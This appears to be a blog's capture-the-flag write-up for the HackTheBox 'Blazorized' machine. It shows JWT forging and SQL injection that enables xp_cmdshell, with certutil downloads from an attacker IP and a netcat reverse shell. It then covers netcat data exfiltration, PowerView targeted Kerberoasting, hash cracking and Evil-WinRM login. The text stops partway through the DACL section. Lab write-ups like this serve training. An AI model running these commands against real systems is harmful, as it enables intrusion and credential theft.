<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.7.0.799084971022">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.7.0">

    <!-- Primary Meta Tags -->
    <title>Blazorized (Hard)</title>
    <meta name="title" content="Blazorized (Hard)">
    <meta name="description" content="Blazorized is a Windows machine, starting with a website written using the Blazor .">

    <!-- Canonical -->
    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/blazorized/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/blazorized/">
    <meta property="og:title" content="Blazorized (Hard)">
    <meta property="og:description" content="Blazorized is a Windows machine, starting with a website written using the Blazor .">
    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/blazorized.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/blazorized/">
    <meta property="twitter:title" content="Blazorized (Hard)">
    <meta property="twitter:description" content="Blazorized is a Windows machine, starting with a website written using the Blazor .">
    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/blazorized.png">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../resources/css/retype.css?v=3.7.0.799084971022" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.7.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.7.0.799084971022" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.7.0.799084971022" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">bytebl33d</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">Blog</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="../../../../blog/">Posts</a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/bytebl33d">GitHub</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <!-- Page content  -->
<doc-anchor-target id="blazorized-hard" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#blazorized-hard">#</doc-anchor-trigger>
        <span>Blazorized (Hard)</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div>In&nbsp;</div>
    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
    <div><a href="../../../../categories/active-directory/">Active-Directory</a>,&nbsp;</div>
    <div><a href="../../../../categories/windows/">Windows</a></div>
    <div class="mx-2">&#9679;</div>
    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-11-09</span></div>
</div>

<p><figure class="content-center">
    <img src="../../../../assets/images/headers/blazorized.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<doc-anchor-target id="synopsis" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
        <span>Synopsis</span>
    </h1>
</doc-anchor-target>
<p>Blazorized is a Windows machine, starting with a website written using the Blazor .NET framework that allows downloading a DLL file that can be reverse engineered to find a JWT secret and use it to get access to the admin panel. The admin panel is vulnerable to an SQL injection to get code execution. To pivot to the next user, the WriteSPN privilege  can be abused to perform a targeted Kerberoast attack on another user. The targeted user is able to write a logon script that ultimately gives access to a user that allows performing a DCSync attack on the domain.</p>
<doc-anchor-target id="reconnaissance">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#reconnaissance">#</doc-anchor-trigger>
        <span>Reconnaissance</span>
    </h2>
</doc-anchor-target>
<p>Starting with an nmap scan, we see that the host is a domain controller and redirects us to <code v-pre>blazorized.htb</code>.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nmap -sCV -oN blazorized.nmap 10.10.11.22
Nmap scan report for 10.10.11.22
Host is up (0.014s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://blazorized.htb
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-02 06:55:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2024-07-02T06:55:15+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-01T14:41:08
|_Not valid after:  2054-07-01T14:41:08
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-02T06:55:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required</code></pre>
</doc-codeblock></div>
<p>We add the domain to our <code v-pre>/etc/hosts</code> file and continue to enumerate the website. On the website we notice that it is built using <code v-pre>Blazor WebAssembly</code>. One feature of the site is to request all posts and categories from the API at <code v-pre>/check-updates</code>.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/check-updates.png" alt="Check for updates">
    <figcaption class="caption">Check for updates</figcaption>
</figure>
</p>
<p>This function makes a request to <code v-pre>api.blazorized.htb</code> so we add this to our host file as well. Intercepting the request in BurpSuite, we see that an authorization token is passed.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/check-updates-api.png" alt="Check for updates API call">
    <figcaption class="caption">Check for updates API call</figcaption>
</figure>
</p>
<doc-anchor-target id="jwt-token-forging">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#jwt-token-forging">#</doc-anchor-trigger>
        <span>JWT Token Forging</span>
    </h3>
</doc-anchor-target>
<p>We can decode the JWT token with <a href="https://jwt.io/">jwt.io</a>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{
  &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;: &quot;superadmin@blazorized.htb&quot;,
  &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;: [
    &quot;Posts_Get_All&quot;,
    &quot;Categories_Get_All&quot;
  ],
  &quot;exp&quot;: 1731143252,
  &quot;iss&quot;: &quot;http://api.blazorized.htb&quot;,
  &quot;aud&quot;: &quot;http://api.blazorized.htb&quot;
}</code></pre>
</doc-codeblock></div>
<p>Another thing to note is that when refreshing the website and intercept our requests, a GET request is made to <code v-pre>/_framework/blazor.boot.json</code>. We can try to extract the <code v-pre>.dll</code> files from the Blazor application by doing a curl command at this endpoint. This will list all loaded dll files by the application.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">$ curl http://blazorized.htb/_framework/blazor.boot.json
{
  &quot;cacheBootResources&quot;: true,
  &quot;config&quot;: [ ],
  &quot;debugBuild&quot;: false,
  &quot;entryAssembly&quot;: &quot;Blazorized.DigitalGarden&quot;,
  &quot;icuDataMode&quot;: 0,
  &quot;linkerEnabled&quot;: true,
  &quot;resources&quot;: {
    &quot;assembly&quot;: {
      &quot;Blazored.LocalStorage.dll&quot;: &quot;sha256-5V8ovY1srbIIz7lzzMhLd3nNJ9LJ6bHoBOnLJahv8Go=&quot;,

      &lt;SNIP&gt;

      &quot;System.Xml.ReaderWriter.dll&quot;: &quot;sha256-9yumv+5QaTSARQB46DStO9vcXQyA3cPvv74jAta3lQA=&quot;
    },
    &quot;extensions&quot;: null,
    &quot;lazyAssembly&quot;: {
      &quot;Blazorized.Helpers.dll&quot;: &quot;sha256-ekLzpGbbVEn95uwSU2BGWpjosCK\/fqqQRjGFUW0jAQQ=&quot;
    },

    &lt;SNIP&gt;

  }
}</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="dll-reversing">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#dll-reversing">#</doc-anchor-trigger>
        <span>DLL Reversing</span>
    </h3>
</doc-anchor-target>
<p>After looking at the files one by one and decompiling them using <code v-pre>dnSpy</code> we find something interesting for the <code v-pre>Blazorized.Helpers.dll</code> in the function <code v-pre>JWT</code>.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/blazor-dll-decompile.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Within the decompiled dll there is a <code v-pre>jwtSymmetricSecurityKey</code> along with several other variables, one of which is an endpoint to the administrator dashboard. We can add this to our hosts file as well.</p>
<doc-anchor-target id="user">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
        <span>User</span>
    </h2>
</doc-anchor-target>
<p>With the found JWT secret and admin subdomain, we can generate a new JWT token with the following payload and using the signature we found (make sure to increase the expiration to make the token valid for a longer period).</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">{
  &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;: &quot;superadmin@blazorized.htb&quot;,
  &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;: [
    &quot;Super_Admin&quot;
  ],
  &quot;exp&quot;: 1732143252,
  &quot;iss&quot;: &quot;http://api.blazorized.htb&quot;,
  &quot;aud&quot;: &quot;http://admin.blazorized.htb&quot;
}</code></pre>
</doc-codeblock></div>
<p>There are several ways to forge another JWT token with the secret we just acquired. The easiest method is to again use <a href="https://jwt.io/">jwt.io</a> and inset the secret in the signature field.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/forged-jwt.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Now you can copy the JWT token and import the token into the browser by creating a new item in Local Storage with the key set to <code v-pre>jwt</code> and the token as the value. Then navigate to <code v-pre>http://admin.blazorized.htb</code> and refresh the page to login.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/admin-panel.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<doc-anchor-target id="sql-injection">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#sql-injection">#</doc-anchor-trigger>
        <span>SQL Injection</span>
    </h3>
</doc-anchor-target>
<p>The Super Admin Panel allows managing posts. One feature is looking for duplicate post titles that is vulnerable to blind SQL injection. This can be verified by the following payload:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">' waitfor delay '00:00:05'--</code></pre>
</doc-codeblock></div>
<p>This will wait for 5 seconds before executing the query. Now that we have verified that we have an SQL injection, let&#x27;s explore what we can do with this. We can try to upload a Netcat binary onto the host to get a reverse shell with <code v-pre>xp_cmdshell</code>. We first have to enable this transaction in order to use it:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -</code></pre>
</doc-codeblock></div>
<p>We receive a notification confirming that the command executed without any errors.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/sqli-enable-shell.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Now lets try to get a reverse shell. We start by hosting the <code v-pre>nc.exe</code> binary with a Python webserver, start a netcat listener and then executing the following queries:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">'; EXEC master.dbo.xp_cmdshell 'certutil -f -urlcache http://10.10.14.4:8888/nc.exe %TEMP%\nc.exe'; -- 
'; EXEC master.dbo.xp_cmdshell '%TEMP%\nc.exe 10.10.14.4 4444 -e cmd.exe'; -- </code></pre>
</doc-codeblock></div>
<p>After executing the payload we get a shell as <code v-pre>nu_1055</code> and can grab the user flag on their desktop.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.22 50130
Microsoft Windows [Version 10.0.17763.5936]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
blazorized\nu_1055</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="root">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
        <span>Root</span>
    </h2>
</doc-anchor-target>
<p>On the machine we see two additional users (<code v-pre>RSA_4810</code> and <code v-pre>SSA_6010</code>).</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Users&gt;dir

 Directory of C:\Users

06/20/2024  06:28 AM    &lt;DIR&gt;          .
06/20/2024  06:28 AM    &lt;DIR&gt;          ..
02/02/2024  04:13 PM    &lt;DIR&gt;          Administrator
02/25/2024  02:41 PM    &lt;DIR&gt;          NU_1055
10/06/2021  02:46 PM    &lt;DIR&gt;          Public
02/01/2024  08:36 AM    &lt;DIR&gt;          RSA_4810
06/19/2024  07:39 AM    &lt;DIR&gt;          SSA_6010</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="bloodhound-enumeration">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound-enumeration">#</doc-anchor-trigger>
        <span>BloodHound Enumeration</span>
    </h3>
</doc-anchor-target>
<p>Since this is a domain controller and we are a domain user, we can run SharpHound to get more information about the users in the domain and what permissions they have.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">C:\Users\NU_1055&gt; certutil -f -urlcache http://10.10.14.4:8888/SharpHound.exe %TEMP%\SharpHound.exe
C:\Users\NU_1055&gt; %temp%\SharpHound.exe -c All --zipfilename &quot;Bloodhound.zip&quot;</code></pre>
</doc-codeblock></div>
<p>We wait for the SharpHound tool to finish and then transfer the ZIP file to our machine.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">$ nc -l -p 4444 &gt; Bloodhound.zip

C:\Users\NU_1055&gt; %temp%\nc.exe -w 3 10.10.14.4 4444 &lt; 20241109040008_Bloodhound.zip</code></pre>
</doc-codeblock></div>
<p>It might be necessary to extract the json files from the ZIP file and converting it to a correct JSON format (using jq). Checking out our results in BloodHound, we see that the user <code v-pre>NU_1055</code> has the ability to write to the &quot;serviceprincipalname&quot; attribute of the user <code v-pre>RSA_4810</code>, therefore we are able to perform a targeted kerberoast attack.</p>
<p><figure class="content-center">
    <img src="../../../../assets/images/writeups/blazorized/bloodhound-nu.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<doc-anchor-target id="writespn-abuse">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#writespn-abuse">#</doc-anchor-trigger>
        <span>WriteSPN Abuse</span>
    </h3>
</doc-anchor-target>
<p>We can copy PowerView onto the host and perform the attack from Windows.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">PS C:\Users\NU_1055&gt; certutil -f -urlcache http://10.10.14.4:8888/PowerView.ps1 PowerView.ps1
PS C:\Users\NU_1055&gt; . .\PowerView.ps1

PS C:\Users\NU_1055&gt; Set-DomainObject -Identity 'RSA_4810' -Set @{serviceprincipalname='nonexistent/BLEED'}
PS C:\Users\NU_1055&gt; $User = Get-DomainUser 'RSA_4810'
PS C:\Users\NU_1055&gt; $User | Get-DomainSPNTicket | fl

$krb5tgs$23$*RSA_4810$blazorized.htb$nonexistent/BLEED*$D7234985D58C1...&lt;SNIP&gt;...EFC94D4506EC6C26</code></pre>
</doc-codeblock></div>
<p>We get back the <code v-pre>krb5tgs</code> hash of the RSA user and can crack it offline.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 13100 RSA_4810.hash $ROCKYOU</code></pre>
</doc-codeblock></div>
<p>The password of the user is <code v-pre>(Ni7856Do9854Ki05Ng0005 #)</code>.</p>
<doc-anchor-target id="dacl-abuse">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#dacl-abuse">#</doc-anchor-trigger>
        <span>DACL Abuse</span>
    </h3>
</doc-anchor-target>
<p>We can now login with Evil-WinRM.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.22 -u 'RSA_4810' -p '(Ni7856Do9854Ki05Ng0005 #)'</code></pre>
</doc-codeblock></div>
<p>We look for ACLs that can be abused using PowerView.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">*Evil-WinRM* PS C:\Users\RSA_4810\Documents&gt; upload PowerView.ps1
